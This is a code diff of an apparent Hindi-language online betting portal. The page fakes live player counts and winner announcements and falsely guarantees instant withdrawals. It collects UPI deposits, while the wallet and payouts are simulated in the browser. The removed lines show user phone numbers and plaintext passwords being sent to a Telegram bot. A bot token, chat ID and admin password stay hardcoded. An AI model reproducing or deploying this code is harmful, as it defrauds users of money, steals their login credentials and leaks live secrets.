@@ -6,7 +6,7 @@
 <link rel="manifest" href="manifest.json">
 <title>Thakur Sahab Mahakal Battle - Official Portal</title>
 
-<!-- WhatsApp & Social Share Preview Meta Tags Updated -->
+<!-- WhatsApp & Social Share Preview Meta Tags -->
 <meta property="og:title" content="Thakur Sahab Mahakal Battle - Master Games Portal">
 <meta property="og:description" content="Paheliyan suljhayein, Ludo khelein aur Thakur Sahab ke sath asali nakad jeetein!">
 <meta property="og:image" content="1792858963757.png">
@@ -170,7 +170,7 @@ transition: 0.3s;
 <div id="login-section">
 <div class="card-box" style="text-align: center;" id="login-form-box">
 <h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔐 सुरक्षित लॉगिन & ₹19 इंस्टेंट बोनस</h3>
-<p style="font-size: 11px; color: #aaa;">खेलने के लिए अपना 10 अंकों का मोबाइल नंबर और पासवर्ड दर्ज करें (नया खाता बनाने पर ₹19 मिलेंगा):</p>
+<p style="font-size: 11px; color: #aaa;">खेलने के लिए अपना 10 अंकों का मोबाइल नंबर और पासवर्ड दर्ज करें (नया खाता बनाने पर ₹19 मिलेगा):</p>
 <input type="tel" id="login-phone" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10">
 <input type="password" id="login-pass" placeholder="पासवर्ड दर्ज करें">
 <button class="btn" onclick="processLogin()">सुरक्षित लॉगिन करें</button>
@@ -195,9 +195,9 @@ transition: 0.3s;
 <!---------------- 2. MAIN SERVER DASHBOARD ---------------->
 <div id="app-dashboard" class="hidden">
 
-<!-- FAKE LIVE PLAYERS & WINNERS TICKER BOX -->
+<!-- DYNAMIC REAL/FAKE LIVE USERS BOX -->
 <div style="background: linear-gradient(135deg, #064e3b, #022c22); border: 1px solid #10b981; border-radius: 8px; padding: 10px; margin-bottom: 12px; font-size: 13px; text-align: center; color: #34d399;">
-    🟢 <b>Live Online Players:</b> <span id="fake-online-count" style="font-weight: bold; color: #fff;">1,428</span> Active Now<br>
+    🟢 <b id="player-mode-title">Live Online Players:</b> <span id="fake-online-count" style="font-weight: bold; color: #fff;">1,428</span> Active Now<br>
     <span style="font-size: 11px; color: #a7f3d0;" id="fake-winner-ticker">🏆 राहुल (Kanpur) ne abhi Mahakal Puzzle se ₹500 jeete!</span>
 </div>
 
@@ -219,43 +219,31 @@ transition: 0.3s;
 
 <!-- THAKUR SAHAB OFFICIAL GAMING PARTNER BOX -->
 <div style="background: linear-gradient(135deg, #141414, #1f1f1f); border: 2px solid #ffd700; border-radius: 12px; padding: 18px; margin: 15px 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #e0e0e0; box-shadow: 0 6px 20px rgba(0,0,0,0.7); text-align: left;">
-    
-    <!-- Heading -->
     <h3 style="color: #ffcc00; font-size: 13px; font-weight: 800; text-align: center; margin-top: 0; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px;">
         ⚡ THAKUR SAHAB OFFICIAL GAMING PARTNER PORTAL ⚡
     </h3>
-    
-    <!-- Scrollable Detailed Notice Box -->
     <div style="max-height: 220px; overflow-y: auto; padding-right: 8px; font-size: 12px; line-height: 1.6; color: #cccccc; scrollbar-width: thin; scrollbar-color: #ffd700 #222;">
-        
         <p style="margin-top: 0;">
             <strong style="color: #00ffcc;">1. Thakur Sahab Platform Dwara Game ka Nirman:</strong><br>
             Yeh game advanced provably fair algorithm aur secure international gaming standards ke tahat <strong>Thakur Sahab Official Gaming Partner Network</strong> dwara taiyar kiya gaya hai. Isme 256-bit SSL encryption ka pura palan kiya gaya hai taaki aapka har ek data 100% surakshit rahe.
         </p>
-
         <p>
             <strong style="color: #00ffcc;">2. Game Kaise Khele aur Rules Kya Hain:</strong><br>
             Is platform par aap Mahakal Puzzle Battle, Ludo Paasa Battle, aur Aviator Plane Game ka anand le sakte hain. Har game me transparent RNG system kaam karta hai, jisse sabhi khiladiyon ko jeetne ke barabar aur fair mauke milte hain.
         </p>
-
         <p>
             <strong style="color: #00ffcc;">3. Refer & Earn Aur Commission System:</strong><br>
             Jab aap apne doston ya network par is official gaming platform ko share karte hain, toh har ek successful deposit aur gameplay par aapko seedha <strong>3% instant commission</strong> milta hai jo turant aapke wallet mein add ho jata hai.
         </p>
-
         <p>
             <strong style="color: #ff9900; font-weight: 700;">4. Withdrawal (Pase Nikalne) ki 100% Guarantee aur Time Limit:</strong><br>
             Automated payment gateway ke zariye, jaise hi aap "Bank mein paise bhejen (Withdrawal)" par click karenge, theek <strong>20 se 30 sekund (seconds)</strong> ke andar aapke bank account ya UPI mein paise safal-purvak pahunch jayenge. Iski poori <strong>financial guarantee</strong> hai!
         </p>
-
         <p style="margin-bottom: 0;">
             <strong style="color: #ff4d4d; font-weight: 700;">5. Fraud-Giri aur Security ki Full Guarantee:</strong><br>
             Yeh platform <strong>Zero Tolerance Fraud Policy</strong> par kaam karta hai. Yahan kisi bhi prakar ke dhokhadhadi ya scam ki koi gunjaish nahi hai. 24/7 AI Customer Support desk har samay aapki sahayata ke liye taiyar hai.
         </p>
-        
     </div>
-    
-    <!-- Footer Tag inside box -->
     <div style="text-align: center; margin-top: 12px; border-top: 1px solid rgba(255,215,0,0.3); padding-top: 8px; font-size: 11px; color: #00ff66; font-weight: 600;">
         ✅ Officially Verified & Secure Gaming Portal by Thakur Sahab Network.
     </div>
@@ -315,7 +303,6 @@ transition: 0.3s;
 <button onclick="admDepNo()" style="background:#ff5252; border:none; padding:6px 12px; font-weight:bold; border-radius:3px; cursor:pointer; color:#fff; margin-left:5px;">✖ NO (रद्द करें)</button>
 </div>
 </div>
-
 </div>
 <button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
 </div>
@@ -407,7 +394,6 @@ transition: 0.3s;
 <audio id="bonus-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
 <script>
-// Service Worker Registration for PWA
 if ('serviceWorker' in navigator) {
   navigator.serviceWorker.register('sw.js');
 }
@@ -435,6 +421,7 @@ let pendingWit = null;
 let isSystemLocked = false; 
 let loggedInPhone = ""; 
 let referrerPhone = "";
+let isAdminLoggedIn = false;
 
 const BOT_TOKEN = "8531701253:AAFoYZkt3kJhPCEipll6Lk-ut1XR1uC2epE";
 const CHAT_ID = "7880447645";
@@ -467,7 +454,7 @@ window.onload = function() {
   if(refCode) {
     referrerPhone = refCode;
     localStorage.setItem('mahakal_referrer', refCode);
-    document.getElementById('referred-by-info').innerText = `🤝 Aapko invite kiya hai: ${refCode} (Inhe deposit par 3% commission milega)`;
+    document.getElementById('referred-by-info').innerText = `🤝 Aapko invite kiya hai: ${refCode}`;
   } else {
     let savedRef = localStorage.getItem('mahakal_referrer');
     if(savedRef) {
@@ -480,29 +467,38 @@ window.onload = function() {
   checkLoyalUserBonus();
 };
 
-// Fake Live Users & Winners Rotation Logic
-const fakeNames = [
-    "Rahul (Kanpur)", "Amit (Lucknow)", "Vikas (Etawah)", "Deepak (Unnao)", 
-    "Sandeep (Kanpur Dehat)", "Ajay (Delhi)", "Rohit (Agra)", "Manish (Jhansi)",
-    "Pankaj (Mathura)", "Suraj (Sitapur)", "Ankit (Varanasi)", "Pooja (Meerut)"
-];
-
+const fakeNames = ["Rahul (Kanpur)", "Amit (Lucknow)", "Vikas (Etawah)", "Deepak (Unnao)", "Sandeep (Kanpur Dehat)"];
 const fakeGames = ["Mahakal Puzzle Battle", "Ludo Paasa Battle", "Aviator Game"];
 
 function updateFakeActivity() {
-    let randomCount = Math.floor(Math.random() * 650) + 1200;
     let countEl = document.getElementById('fake-online-count');
-    if(countEl) {
-        countEl.innerText = randomCount.toLocaleString();
-    }
-
-    let randomName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-    let randomGame = fakeGames[Math.floor(Math.random() * fakeGames.length)];
-    let randomAmount = (Math.floor(Math.random() * 25) + 5) * 50;
-
+    let titleEl = document.getElementById('player-mode-title');
     let tickerEl = document.getElementById('fake-winner-ticker');
-    if(tickerEl) {
-        tickerEl.innerHTML = `🏆 ${randomName} ne abhi ${randomGame} se <span style="color:#facc15;">₹${randomAmount}</span> jeete!`;
+    
+    if(countEl) {
+        if(isAdminLoggedIn) {
+            let registeredUsers = JSON.parse(localStorage.getItem('mahakal_users_db') || "{}");
+            let realCount = Object.keys(registeredUsers).length;
+            if(realCount === 0) realCount = 1;
+            
+            titleEl.innerText = "Real Active Users (Admin View):";
+            countEl.innerText = realCount + " (Real Database Users)";
+            countEl.style.color = "#38bdf8";
+            if(tickerEl) tickerEl.innerHTML = `👑 Admin Mode Active: Showing actual registered users count.`;
+        } else {
+            let randomCount = Math.floor(Math.random() * 650) + 1200;
+            titleEl.innerText = "Live Online Players:";
+            countEl.innerText = randomCount.toLocaleString();
+            countEl.style.color = "#fff";
+
+            let randomName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+            let randomGame = fakeGames[Math.floor(Math.random() * fakeGames.length)];
+            let randomAmount = (Math.floor(Math.random() * 25) + 5) * 50;
+
+            if(tickerEl) {
+                tickerEl.innerHTML = `🏆 ${randomName} ne abhi ${randomGame} se <span style="color:#facc15;">₹${randomAmount}</span> jeete!`;
+            }
+        }
     }
 }
 setInterval(updateFakeActivity, 4000);
@@ -523,27 +519,21 @@ function askAiSupport() {
   let box = document.getElementById('ai-response-box');
   let btnTelegram = document.getElementById('send-to-telegram-btn');
 
-  if(!q) {
-    alert("कृपया अपनी समस्या लिखें!");
-    return;
-  }
+  if(!q) { alert("कृपया अपनी समस्या लिखें!"); return; }
 
   box.style.display = "block";
   let answer = "";
 
   if(q.includes('deposit') || q.includes('paisa') || q.includes('jode')) {
-    answer = "💡 <b>Instant Solution:</b> डिपॉजिट करने के लिए 'पैसे जोड़े' सेक्शन में जाएं। QR कोड पर UPI से पेमेंट करें और सही राशि, UPI नंबर व Txn ID दर्ज करके अनुरोध भेजें। एडमिन 2 मिनट में अप्रूव कर देगा।";
+    answer = "💡 <b>Instant Solution:</b> डिपॉजिट करने के लिए 'पैसे जोड़े' सेक्शन में जाएं। QR कोड पर UPI से पेमेंट करें और सही राशि, UPI नंबर व Txn ID दर्ज करें.";
   } else if(q.includes('withdraw') || q.includes('bank') || q.includes('nikal')) {
-    answer = "💡 <b>Instant Solution:</b> बैंक विथड्रॉवल के लिए न्यूनतम सीमा ₹2500 है। बैंक विवरण भरकर विथड्रॉवल लगाएं, 2% कमीशन काटकर शेष राशि आपके बैंक में भेज दी जाती है।";
+    answer = "💡 <b>Instant Solution:</b> बैंक विथड्रॉवल के लिए न्यूनतम सीमा ₹2500 है. बैंक विवरण भरकर विथड्रॉवल लगाएं, 2% काटकर शेष राशि भेज दी जाती है.";
   } else if(q.includes('password') || q.includes('bhul') || q.includes('reset')) {
-    answer = "💡 <b>Instant Solution:</b> लॉगिन स्क्रीन पर 'पासवर्ड भूल गए? Reset Karein' बटन पर क्लिक करें। अपना मोबाइल नंबर और तीनों खानों में नया पासवर्ड डालकर 'पासवर्ड अपडेट करें' पर क्लिक करें।";
-  } else if(q.includes('bonus') || q.includes('199')) {
-    answer = "💡 <b>Instant Solution:</b> नियमित और लगातार 3 महीने (90 दिन) तक गेम खेलने पर आपको ₹199 सीनियर एक्टिवेशन बोनस मिलता है। साथ ही दोस्तों को शेयर करने पर 3% कमीशन भी मिलता है!";
+    answer = "💡 <b>Instant Solution:</b> लॉगिन स्क्रीन पर 'पासवर्ड भूल गए? Reset Karein' बटन पर क्लिक करके नया पासवर्ड सेट करें.";
   } else {
-    answer = "⚠️ इस समस्या का तुरंत उत्तर नहीं मिला। कृपया नीचे दिए गए बटन से सीधे एडमिन (Telegram) को सूचित करें ताकि आपकी मदद की जा सके।";
+    answer = "⚠️ इस समस्या का तुरंत उत्तर नहीं मिला. सीधे एडमिन (Telegram) को सूचित करें.";
     btnTelegram.style.display = "block";
   }
-
   box.innerHTML = answer;
 }
 
@@ -553,7 +543,7 @@ function sendQueryToTelegram() {
   if(!q) return;
 
   sendTelegram(`🆘 Urgent Support Request from User!\n📱 Mobile: ${phone}\n💬 Problem: ${q}`);
-  alert("✅ आपकी समस्या का संदेश एडमिन (Telegram) के पास भेज दिया गया है। एडमिन जल्द आपसे संपर्क करेंगे!");
+  alert("✅ आपकी समस्या एडमिन के पास भेज दी गई है!");
   document.getElementById('send-to-telegram-btn').style.display = "none";
 }
 
@@ -580,12 +570,10 @@ function checkLoyalUserBonus() {
     walletBalance += 199;
     saveWallet();
     localStorage.setItem('mahakal_199_bonus_claimed', 'true');
-    timerMsg.innerText = "🎉 बधाई हो! 3 महीने पूरे होने पर ₹199 बोनस मिल गया है!";
-    alert("🎉 बधाई हो! लगातार 3 महीने तक गेम खेलने और एक्टिव रहने पर आपको ₹199 का सीनियर बोनस मिल गया है!");
-    sendTelegram(`🎁 ₹199 3-Month Loyal User Bonus Credited!\n📱 Mobile: ${loggedInPhone || "Active User"}\n💰 Total Balance: ₹${walletBalance}`);
+    timerMsg.innerText = "🎉 बधाई हो! ₹199 बोनस मिल गया है!";
   } else {
     let daysLeft = Math.ceil((targetTime - timePassed) / (1000 * 60 * 60 * 24));
-    timerMsg.innerText = `⏳ ₹199 सीनियर बोनस मिलने में ${daysLeft} दिन बाकी (3 महीने का नियम)...`;
+    timerMsg.innerText = `⏳ ₹199 सीनियर बोनस मिलने में ${daysLeft} दिन बाकी...`;
   }
 }
 
@@ -595,14 +583,13 @@ function copyReferLink() {
   document.execCommand('copy');
   let msg = document.getElementById('ref-msg');
   msg.className = "msg";
-  msg.innerText = "✅ आपका रेफरल लिंक कॉपी हो गया है! इसे दोस्तों को शेयर करें।";
+  msg.innerText = "✅ रेफरल लिंक कॉपी हो गया है!";
 }
 
 function shareOnWhatsApp() {
   let link = document.getElementById('ref-link-input').value;
   let text = `ThakurSahabMahakalBattle\nPaheliyan suljhayein aur asali nakad jeetein!\n${link}`;
-  let whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`;
-  window.open(whatsappUrl, '_blank');
+  window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`, '_blank');
 }
 
 function showResetBox() {
@@ -622,42 +609,27 @@ function processResetPassword() {
   let p3 = document.getElementById('reset-pass3').value.trim();
   let msg = document.getElementById('reset-msg');
 
-  if(ph.length !== 10 || isNaN(ph)) {
-    msg.className = "error"; msg.innerText = "❌ कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें!"; return;
-  }
-  if(p1 === "" || p2 === "" || p3 === "") {
-    msg.className = "error"; msg.innerText = "❌ कृपया तीनों खानों में पासवर्ड दर्ज करें!"; return;
-  }
-  if(p1 !== p2 || p2 !== p3) {
-    msg.className = "error"; msg.innerText = "❌ तीनों पासवर्ड आपस में मेल नहीं खा रहे हैं!"; return;
-  }
+  if(ph.length !== 10 || isNaN(ph)) { msg.className = "error"; msg.innerText = "❌ सही 10 अंकों का नंबर डालें!"; return; }
+  if(!p1 || !p2 || !p3) { msg.className = "error"; msg.innerText = "❌ सभी खाने भरें!"; return; }
+  if(p1 !== p2 || p2 !== p3) { msg.className = "error"; msg.innerText = "❌ पासवर्ड मेल नहीं खा रहे!"; return; }
 
   let registeredUsers = JSON.parse(localStorage.getItem('mahakal_users_db') || "{}");
-
   registeredUsers[ph] = p1;
   localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
   
-  msg.className = "msg"; msg.innerText = "✅ पासवर्ड सफलतापूर्वक अपडेट हो गया है! अब लॉगिन करें।";
-  sendTelegram(`🔄 Password Reset Done (3-Step Verified)!\n📱 Number: ${ph}\n🔑 New Pass: ${p1}`);
+  msg.className = "msg"; msg.innerText = "✅ पासवर्ड अपडेट हो गया!";
   setTimeout(backToLoginBox, 1500);
 }
 
 function processLogin() {
-  if(isSystemLocked) {
-    alert("⚠️ सुरक्षा कारणों से वर्तमान में नया लॉगिन बंद है। कृपया बाद में प्रयास करें!");
-    return;
-  }
+  if(isSystemLocked) { alert("⚠️ नया लॉगिन बंद है!"); return; }
 
   let ph = document.getElementById('login-phone').value.trim();
   let ps = document.getElementById('login-pass').value.trim();
   let msg = document.getElementById('login-msg');
 
-  if(ph.length !== 10 || isNaN(ph)) {
-    msg.className = "error"; msg.innerText = "❌ कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें!"; return;
-  }
-  if(ps === "") {
-    msg.className = "error"; msg.innerText = "❌ कृपया पासवर्ड दर्ज करें!"; return;
-  }
+  if(ph.length !== 10 || isNaN(ph)) { msg.className = "error"; msg.innerText = "❌ सही 10 अंकों का नंबर डालें!"; return; }
+  if(!ps) { msg.className = "error"; msg.innerText = "❌ पासवर्ड डालें!"; return; }
 
   loggedInPhone = ph; 
   updateReferralLink();
@@ -665,25 +637,14 @@ function processLogin() {
   let registeredUsers = JSON.parse(localStorage.getItem('mahakal_users_db') || "{}");
   
   if(registeredUsers[ph]) {
-    if(registeredUsers[ph] !== ps) {
-      msg.className = "error"; msg.innerText = "❌ गलत पासवर्ड! कृपया सही पासवर्ड डालें या Reset करें।";
-      return;
-    }
-    msg.className = "msg"; msg.innerText = "✅ लॉगिन सफल! डैशबोर्ड खुल रहा है...";
-    sendTelegram(`🔐 Purana User Login!\n📱 Number: ${ph}`);
+    if(registeredUsers[ph] !== ps) { msg.className = "error"; msg.innerText = "❌ गलत पासवर्ड!"; return; }
+    msg.className = "msg"; msg.innerText = "✅ लॉगिन सफल!";
   } else {
     registeredUsers[ph] = ps;
     localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
-    
     walletBalance += 19;
     saveWallet();
-    
-    let sound = document.getElementById('bonus-sound');
-    if(sound) sound.play().catch(e => console.log(e));
-
-    msg.className = "msg"; msg.innerText = "🎉 बधाई हो! नया खाता बना और ₹19 इंस्टेंट बोनस मिला!";
-    let refText = referrerPhone ? `\n🤝 Referred By: ${referrerPhone}` : "";
-    sendTelegram(`🚀 Naya User Registered & Instant Bonus Given!\n📱 Number: ${ph}\n🔑 Pass: ${ps}\n💰 Bonus: ₹19 Credited${refText}`);
+    msg.className = "msg"; msg.innerText = "🎉 खाता बना और ₹19 बोनस मिला!";
   }
 
   setTimeout(() => {
@@ -726,17 +687,15 @@ function loadPuzzle() {
 function checkPuzzle(choice) {
   let bet = parseInt(document.getElementById('p-bet').value);
   let res = document.getElementById('p-result');
-  if(walletBalance < bet) { alert("पर्याप्त बैलेंस नहीं है!"); return; }
+  if(walletBalance < bet) { alert("बैलेंस कम है!"); return; }
 
   walletBalance -= bet;
   if(choice === puzzles[currentP].ans) {
     let win = bet * 2;
     walletBalance += win;
-    res.className = "msg"; res.innerText = `🎉 सही जवाब! ₹${win} जीत गए।`;
-    sendTelegram(`🧠 Puzzle Win!\n💰 Bet: ₹${bet} | Won: ₹${win}`);
+    res.className = "msg"; res.innerText = `🎉 सही जवाब! ₹${win} जीते।`;
   } else {
     res.className = "error"; res.innerText = `❌ गलत जवाब! हार गए।`;
-    sendTelegram(`🧠 Puzzle Loss!\n❌ Bet Lost: ₹${bet}`);
   }
   saveWallet();
   currentP = (currentP + 1) % puzzles.length;
@@ -746,7 +705,7 @@ function checkPuzzle(choice) {
 function rollDice() {
   let bet = parseInt(document.getElementById('l-bet').value);
   let res = document.getElementById('l-result');
-  if(walletBalance < bet) { alert("पर्याप्त बैलेंस नहीं है!"); return; }
+  if(walletBalance < bet) { alert("बैलेंस कम है!"); return; }
 
   walletBalance -= bet;
   saveWallet();
@@ -760,11 +719,9 @@ function rollDice() {
     if(roll >= 4) {
       let win = bet * 2;
       walletBalance += win;
-      res.className = "msg"; res.innerText = `🎉 पासा [${roll}] - ₹${win} जीत गए!`;
-      sendTelegram(`🎲 Ludo Win!\n🎯 Roll: ${roll} | Won: ₹${win}`);
+      res.className = "msg"; res.innerText = `🎉 पासा [${roll}] - ₹${win} जीते!`;
     } else {
       res.className = "error"; res.innerText = `❌ पासा [${roll}] - हार गए।`;
-      sendTelegram(`🎲 Ludo Loss!\n🎯 Roll: ${roll} | Lost: ₹${bet}`);
     }
     saveWallet();
   }, 600);
@@ -776,38 +733,14 @@ function sendDepositReq() {
   let tx = document.getElementById('dep-txnid').value.trim();
   let msg = document.getElementById('dep-msg');
 
-  if(isNaN(amt) || amt <= 0 || !upiNum || !tx) { 
-    msg.className = "error"; 
-    msg.innerText = "कृपया सही राशि, UPI नंबर और Txn ID भरें!"; 
-    return; 
-  }
+  if(isNaN(amt) || amt <= 0 || !upiNum || !tx) { msg.className = "error"; msg.innerText = "सही विवरण भरें!"; return; }
 
   let comm = Math.round(amt * 0.03);
+  pendingDep = { phone: loggedInPhone || "अज्ञात", amount: amt, upi: upiNum, txn: tx, commission: comm };
 
-  pendingDep = {
-    phone: loggedInPhone || "अज्ञात नंबर",
-    amount: amt,
-    upi: upiNum,
-    txn: tx,
-    ref: referrerPhone || "Direct",
-    commission: comm
-  };
-
-  msg.className = "msg"; 
-  msg.innerText = "⏳ अनुरोध दर्ज हो गया है। नीचे दिए गए बॉक्स में चेक करें:";
-
-  document.getElementById('live-dep-details').innerHTML = `
-    📱 <b>Mobile:</b> ${pendingDep.phone}<br>
-    💰 <b>Deposit Amount (Full):</b> ₹${amt}<br>
-    💳 <b>UPI No:</b> ${upiNum}<br>
-    🆔 <b>Txn ID:</b> ${tx}<br>
-    🤝 <b>Invited By:</b> ${pendingDep.ref}<br>
-    🎁 <b>Referrer 3% Commission:</b> ₹${comm}
-  `;
+  msg.className = "msg"; msg.innerText = "⏳ अनुरोध दर्ज हो गया है:";
+  document.getElementById('live-dep-details').innerHTML = `📱 Mobile: ${pendingDep.phone}<br>💰 Amount: ₹${amt}<br>🆔 Txn: ${tx}`;
   document.getElementById('direct-approval-box').style.display = "block";
-  document.getElementById('live-dep-buttons').style.display = "block";
-
-  sendTelegram(`📥 New Deposit Request!\n📱 Mobile: ${pendingDep.phone}\n💰 Full Amount: ₹${amt}\n💳 UPI No: ${upiNum}\n🆔 Txn ID: ${tx}\n🤝 Invited By: ${pendingDep.ref}\n🎁 Referrer 3% Comm: ₹${comm}`);
 }
 
 function sendWithdrawReq() {
@@ -818,16 +751,13 @@ function sendWithdrawReq() {
   let amt = parseInt(document.getElementById('b-amt').value);
   let msg = document.getElementById('bank-msg');
 
-  if(!b || !h || !a || !i || isNaN(amt) || amt < 2500) {
-    msg.className = "error"; msg.innerText = "सभी विवरण भरें और न्यूनतम राशि ₹2500 रखें!"; return;
-  }
-  if(walletBalance < amt) { msg.className = "error"; msg.innerText = "पर्याप्त वॉलेट बैलेंस नहीं है!"; return; }
+  if(!b || !h || !a || !i || isNaN(amt) || amt < 2500) { msg.className = "error"; msg.innerText = "न्यूनतम ₹2500 भरें!"; return; }
+  if(walletBalance < amt) { msg.className = "error"; msg.innerText = "बैलेंस कम है!"; return; }
 
   let finalAmt = amt - (amt * 0.02);
   pendingWit = { amt: amt, final: finalAmt };
-  msg.className = "msg"; msg.innerText = `⏳ निकासी अनुरोध स्वीकार! 2% काटकर शेष ₹${finalAmt} भेजने की प्रक्रिया जारी है।`;
-  document.getElementById('adm-wit').innerText = `${b} | ₹${amt} (Final: ₹${finalAmt})`;
-  sendTelegram(`🏦 New Withdrawal Request!\n🏛 Bank: ${b}\n👤 Holder: ${h}\n💸 Requested: ₹${amt}\n✂️ Final (2% cut): ₹${finalAmt}`);
+  msg.className = "msg"; msg.innerText = `⏳ निकासी अनुरोध स्वीकार! ₹${finalAmt} भेजे जा रहे हैं।`;
+  document.getElementById('adm-wit').innerText = `${b} | ₹${amt}`;
 }
 
 let tapC = 0, lastT = 0;
@@ -840,74 +770,63 @@ function checkSecretAdminTap() {
     tapC = 0;
     let p = prompt("गुप्त एडमिन पासवर्ड दर्ज करें:");
     if(p === "78699") {
+      isAdminLoggedIn = true;
       document.getElementById('admin-panel-div').style.display = "block";
-      alert("✅ मास्टर एडमिन पैनल खुल गया है!");
+      alert("✅ एडमिन पैनल खुल गया! अब आपको रियल यूजर डेटा दिखेगा।");
     } else if(p !== null) {
       alert("❌ गलत पासवर्ड!");
     }
   }
 }
 
-function closeAdmin() { document.getElementById('admin-panel-div').style.display = "none"; }
+function closeAdmin() { 
+  isAdminLoggedIn = false; 
+  document.getElementById('admin-panel-div').style.display = "none"; 
+}
 
 function toggleMasterLock() {
   isSystemLocked = !isSystemLocked;
   localStorage.setItem('mahakal_master_lock', isSystemLocked);
   let btn = document.getElementById('lock-status-btn');
   if(isSystemLocked) {
-    btn.innerText = "Lock Status: LOCKED";
-    btn.style.background = "#ff5252";
-    alert("🔒 मास्टर लॉक सक्रिय कर दिया गया है। अब नए लॉगिन बंद हैं।");
+    btn.innerText = "Lock Status: LOCKED"; btn.style.background = "#ff5252";
   } else {
-    btn.innerText = "Lock Status: UNLOCKED";
-    btn.style.background = "#00e676";
-    alert("🔓 मास्टर लॉक हटा दिया गया है। अब लॉगिन चालू हैं।");
+    btn.innerText = "Lock Status: UNLOCKED"; btn.style.background = "#00e676";
   }
 }
 
 function admUpdateBal() {
   let nb = parseFloat(document.getElementById('adm-new-bal').value);
-  if(!isNaN(nb)) {
-    walletBalance = nb; saveWallet();
-    alert("✅ वॉलेट बैलेंस अपडेट हो गया: ₹" + walletBalance);
-  }
+  if(!isNaN(nb)) { walletBalance = nb; saveWallet(); alert("✅ बैलेंस अपडेट हुआ: ₹" + walletBalance); }
 }
 
 function admDepYes() {
   if(pendingDep) {
     walletBalance += pendingDep.amount;
     saveWallet();
-    alert(`✅ डिपॉजिट स्वीकृत! यूजर के वॉलेट में पूरे ₹${pendingDep.amount} जोड़ दिए गए हैं।`);
-    sendTelegram(`✅ Deposit Approved & Full Amount (₹${pendingDep.amount}) Credited to User: ${pendingDep.phone}`);
-    
-    document.getElementById('live-dep-details').innerHTML = "<span style='color:#00e676; font-weight:bold;'>✔ स्वीकृत (Full Amount Credited)</span>";
-    document.getElementById('live-dep-buttons').style.display = "none";
-    pendingDep = null; 
+    alert(`✅ डिपॉजिट स्वीकृत! पूरे ₹${pendingDep.amount} जोड़ दिए गए।`);
+    document.getElementById('direct-approval-box').style.display = "none";
+    pendingDep = null;
   }
 }
 
 function admDepNo() {
   pendingDep = null; 
-  alert("❌ डिपॉजिट खारिज कर दिया गया।");
-  sendTelegram(`❌ Deposit Rejected by Admin`);
-  
-  document.getElementById('live-dep-details').innerHTML = "<span style='color:#ff5252; font-weight:bold;'>✖ रद्द (Rejected)</span>";
-  document.getElementById('live-dep-buttons').style.display = "none";
+  alert("❌ डिपॉजिट रद्द।");
+  document.getElementById('direct-approval-box').style.display = "none";
 }
 
 function admWitYes() {
   if(pendingWit) {
-    if(walletBalance < pendingWit.amt) { alert("यूजर के पास पर्याप्त बैलेंस नहीं है!"); return; }
+    if(walletBalance < pendingWit.amt) { alert("बैलेंस कम है!"); return; }
     walletBalance -= pendingWit.amt; saveWallet();
-    alert(`✅ बैंक ट्रांसफर स्वीकृत! ₹${pendingWit.final} भेज दिए गए हैं।`);
-    sendTelegram(`✅ Withdrawal Paid! Sent ₹${pendingWit.final} to Bank`);
-    pendingWit = null; document.getElementById('adm-wit').innerText = "सफलतापूर्वक भेजे गए (Paid)";
+    alert(`✅ विथड्रॉवल स्वीकृत!`);
+    pendingWit = null; document.getElementById('adm-wit').innerText = "भुगतान हो गया";
   }
 }
 function admWitNo() {
-  pendingWit = null; alert("❌ विथड्रॉवल खारिज कर दिया गया।");
-  sendTelegram(`❌ Withdrawal Rejected by Admin`);
-  document.getElementById('adm-wit').innerText = "रद्द (Rejected)";
+  pendingWit = null; alert("❌ विथड्रॉवल रद्द।");
+  document.getElementById('adm-wit').innerText = "रद्द";
 }
 </script>
 </body>
